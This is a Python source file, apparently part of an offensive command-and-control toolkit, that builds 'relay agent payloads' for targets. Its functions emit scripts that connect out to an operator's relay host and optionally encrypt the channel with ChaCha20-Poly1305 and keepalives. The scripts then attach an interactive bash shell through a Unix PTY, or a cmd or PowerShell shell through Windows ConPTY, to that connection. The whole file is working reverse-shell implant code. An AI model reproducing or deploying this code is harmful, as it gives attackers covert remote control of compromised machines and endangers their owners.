#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Self-contained Python source fragments for relay agent payloads on targets.

Targets need: pip install cryptography
"""

from __future__ import annotations

from typing import Optional

from lib.shell.pty_runtime import PTY_MAGIC, build_unix_pty_script


def build_secure_relay_connect_block(
    host: str,
    port: int,
    token: str,
    *,
    psk: str = "",
    keepalive_interval: float = 30.0,
    encrypt: bool = True,
) -> str:
    """Return Python statements assigning connected socket to ``s``."""
    host_lit = repr(str(host))
    port_lit = int(port)
    token_lit = repr(str(token))
    psk_lit = repr(str(psk))
    keep_lit = float(keepalive_interval)
    if not encrypt:
        return (
            f"import socket\n"
            f"h={host_lit};p={port_lit};tok={token_lit}\n"
            "s=socket.create_connection((h,p))\n"
            f"s.sendall(f'KSRL:v2:AGENT:{{tok}}\\n'.encode())\n"
            "buf=b''\n"
            "while b'\\n' not in buf:\n"
            " c=s.recv(1)\n"
            " if not c: raise SystemExit('relay handshake failed')\n"
            " buf+=c\n"
            "if not buf.decode().startswith('KSRL:OK'):\n"
            " raise SystemExit('relay rejected')\n"
        )

    return (
        "import socket,struct,threading,time\n"
        "from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305\n"
        "from cryptography.hazmat.primitives.kdf.hkdf import HKDF\n"
        "from cryptography.hazmat.primitives import hashes\n"
        f"h={host_lit};p={port_lit};tok={token_lit};psk={psk_lit};ki={keep_lit}\n"
        "FM=b'KSF1';TD=1;TK=2;TA=3\n"
        "def _dk(t,p):\n"
        " m=f'{t}\\0{p}'.encode()\n"
        " return HKDF(algorithm=hashes.SHA256(),length=32,salt=b'kittyrelay-v2-e2e',info=b'ksrl-chacha20').derive(m)\n"
        "class RS:\n"
        " def __init__(self,so,k,ki):\n"
        "  self._s=so;self._c=ChaCha20Poly1305(k);self._ss=0;self._rs=0;self._rb=bytearray();self._xb=bytearray();self._lr=time.monotonic();self._ki=ki;self._st=threading.Event()\n"
        "  if ki>0: threading.Thread(target=self._kl,daemon=True).start()\n"
        " def _n(self,s): return b'\\0\\0\\0\\0'+struct.pack('>Q',s&0xffffffffffffffff)\n"
        " def _sf(self,t,p=b''):\n"
        "  n=self._n(self._ss);self._ss+=1;ct=self._c.encrypt(n,bytes([t])+p,FM);self._s.sendall(FM+struct.pack('>I',len(ct))+ct)\n"
        " def _rf(self):\n"
        "  while len(self._xb)<8:\n"
        "   c=self._s.recv(4096);\n"
        "   if not c: raise SystemExit('relay closed');self._xb.extend(c)\n"
        "  if self._xb[:4]!=FM: raise SystemExit('bad frame')\n"
        "  ln=struct.unpack('>I',bytes(self._xb[4:8]))[0];del self._xb[:8]\n"
        "  while len(self._xb)<ln:\n"
        "   c=self._s.recv(4096);\n"
        "   if not c: raise SystemExit('relay closed');self._xb.extend(c)\n"
        "  ct=bytes(self._xb[:ln]);del self._xb[:ln]\n"
        "  pl=self._c.decrypt(self._n(self._rs),ct,FM);self._rs+=1;self._lr=time.monotonic();return pl[0],pl[1:]\n"
        " def _kl(self):\n"
        "  while not self._st.wait(self._ki):\n"
        "   try:self._sf(TK,b'')\n"
        "   except: break\n"
        " def sendall(self,d):\n"
        "  if isinstance(d,str): d=d.encode()\n"
        "  i=0\n"
        "  while i<len(d): ch=d[i:i+60000];self._sf(TD,ch);i+=len(ch)\n"
        " def recv(self,n):\n"
        "  while not self._rb:\n"
        "   t,p=self._rf()\n"
        "   if t==TD: self._rb.extend(p)\n"
        "   elif t==TK: self._sf(TA,b'')\n"
        "  o=bytes(self._rb[:n]);del self._rb[:n];return o\n"
        " def settimeout(self,t): self._s.settimeout(t)\n"
        "raw=socket.create_connection((h,p))\n"
        "raw.sendall(f'KSRL:v2:AGENT:{tok}\\n'.encode())\n"
        "buf=b''\n"
        "while b'\\n' not in buf:\n"
        " c=raw.recv(1)\n"
        " if not c: raise SystemExit('relay handshake failed')\n"
        " buf+=c\n"
        "if not buf.decode().startswith('KSRL:OK'):\n"
        " raise SystemExit('relay rejected')\n"
        "s=RS(raw,_dk(tok,psk),ki)\n"
    )


def build_relay_pty_agent_script(
    host: str,
    port: int,
    token: str,
    shell: str = "/bin/bash",
    *,
    psk: str = "",
    keepalive_interval: float = 30.0,
    encrypt: bool = True,
    use_pty: bool = True,
    private_key_pem: Optional[str] = None,
) -> str:
    """Full Unix agent script: relay connect (+ optional E2E) then PTY shell."""
    connect = build_secure_relay_connect_block(
        host,
        port,
        token,
        psk=psk,
        keepalive_interval=keepalive_interval,
        encrypt=encrypt,
    )
    if private_key_pem:
        from lib.implant.identity import embedded_sign_hello_code

        connect += embedded_sign_hello_code(private_key_pem)
    magic = repr(PTY_MAGIC)
    connect += f"s.sendall({magic})\n"

    if not use_pty:
        shell_lit = shell.replace("\\", "\\\\").replace("'", "\\'")
        return (
            connect
            + "import subprocess,os\n"
            + f"subprocess.call(['{shell_lit}','-i'],stdin=s,stdout=s,stderr=s)\n"
        )

    # PTY relay over socket ``s`` (works with RS or plain socket via sendall/recv)
    shell_lit = shell.replace("\\", "\\\\").replace("'", "\\'")
    return (
        connect
        + "import os,pty,select\n"
        + f"sh='{shell_lit}'\n"
        + "pid,fd=pty.fork()\n"
        + "if pid==0:\n"
        + " os.setsid()\n"
        + " os.execlp(sh,sh.split('/')[-1],'-i')\n"
        + "while True:\n"
        + " r,_,_=select.select([s,fd],[],[],None)\n"
        + " if s in r:\n"
        + "  data=s.recv(4096)\n"
        + "  if not data: break\n"
        + "  os.write(fd,data)\n"
        + " if fd in r:\n"
        + "  data=os.read(fd,4096)\n"
        + "  if not data: break\n"
        + "  s.sendall(data)\n"
    )


def build_relay_conpty_agent_script(
    host: str,
    port: int,
    token: str,
    shell: str = "cmd.exe",
    *,
    psk: str = "",
    keepalive_interval: float = 30.0,
    encrypt: bool = True,
    private_key_pem: Optional[str] = None,
) -> str:
    """Windows relay agent: E2E connect + ConPTY shell over relay stream ``s``."""
    connect = build_secure_relay_connect_block(
        host,
        port,
        token,
        psk=psk,
        keepalive_interval=keepalive_interval,
        encrypt=encrypt,
    )
    if private_key_pem:
        from lib.implant.identity import embedded_sign_hello_code

        connect += embedded_sign_hello_code(private_key_pem)

    shell_lit = shell.replace("\\", "\\\\").replace("'", "\\'")
    if shell.lower().endswith("powershell.exe"):
        cmd_lit = shell_lit + " -NoLogo -NoProfile"
    else:
        cmd_lit = shell_lit
    magic = repr(PTY_MAGIC)

    return (
        connect
        + f"s.sendall({magic})\n"
        + "import ctypes\nfrom ctypes import wintypes\n"
        + f"sh='{cmd_lit}'\n"
        + "k=ctypes.windll.kernel32\n"
        + "class C(ctypes.Structure):\n _fields_=[('X',wintypes.SHORT),('Y',wintypes.SHORT)]\n"
        + "class S(ctypes.Structure):\n _fields_=[('X',wintypes.SHORT),('Y',wintypes.SHORT)]\n"
        + "class SI(ctypes.Structure):\n _fields_=[('StartupInfo',wintypes.STARTUPINFOW),('lpAttributeList',ctypes.c_void_p)]\n"
        + "PTC=0x00020016;ESP=0x00080000;CUE=0x00000400\n"
        + "ir=iw=or_=ow=wintypes.HANDLE();sa=wintypes.SECURITY_ATTRIBUTES();sa.nLength=ctypes.sizeof(sa);sa.bInheritHandle=True\n"
        + "if not k.CreatePipe(ctypes.byref(ir),ctypes.byref(iw),ctypes.byref(sa),0):raise ctypes.WinError()\n"
        + "if not k.CreatePipe(ctypes.byref(or_),ctypes.byref(ow),ctypes.byref(sa),0):raise ctypes.WinError()\n"
        + "k.SetHandleInformation(iw,1,0);k.SetHandleInformation(or_,1,0)\n"
        + "hpc=ctypes.c_void_p();sz=S(C(120,40));hr=k.CreatePseudoConsole(sz,ir,ow,0,ctypes.byref(hpc))\n"
        + "if hr:raise OSError('CreatePseudoConsole failed')\n"
        + "k.CloseHandle(ir);k.CloseHandle(ow)\n"
        + "sz2=wintypes.SIZE_T(0);k.InitializeProcThreadAttributeList(None,1,0,ctypes.byref(sz2))\n"
        + "al=ctypes.create_string_buffer(sz2.value)\n"
        + "if not k.InitializeProcThreadAttributeList(al,1,0,ctypes.byref(sz2)):raise ctypes.WinError()\n"
        + "if not k.UpdateProcThreadAttribute(al,0,PTC,hpc,ctypes.sizeof(hpc),None,None):raise ctypes.WinError()\n"
        + "si=SI();si.StartupInfo.cb=ctypes.sizeof(SI);si.lpAttributeList=ctypes.cast(al,ctypes.c_void_p)\n"
        + "pi=wintypes.PROCESS_INFORMATION();cmd=sh if sh.endswith('\\0') else sh+'\\0'\n"
        + "if not k.CreateProcessW(None,ctypes.create_unicode_buffer(cmd),None,None,False,ESP|CUE,None,None,ctypes.byref(si.StartupInfo),ctypes.byref(pi)):raise ctypes.WinError()\n"
        + "k.DeleteProcThreadAttributeList(al)\n"
        + "ci,co=int(iw),int(or_)\n"
        + "def _rh(h):\n b=ctypes.create_string_buffer(4096);n=wintypes.DWORD(0);ok=k.ReadFile(wintypes.HANDLE(h),b,4096,ctypes.byref(n),None);return b.raw[:n.value] if ok and n.value else b''\n"
        + "def _wh(h,d):\n"
        + " if not d: return\n n=wintypes.DWORD(0)\n"
        + " if not k.WriteFile(wintypes.HANDLE(h),d,len(d),ctypes.byref(n),None): raise ctypes.WinError()\n"
        + "while True:\n"
        + " try:\n"
        + "  data=_rh(co)\n"
        + "  if data: s.sendall(data)\n"
        + "  elif data==b'': break\n"
        + "  data=s.recv(4096)\n"
        + "  if not data: break\n"
        + "  _wh(ci,data)\n"
        + " except: break\n"
    )
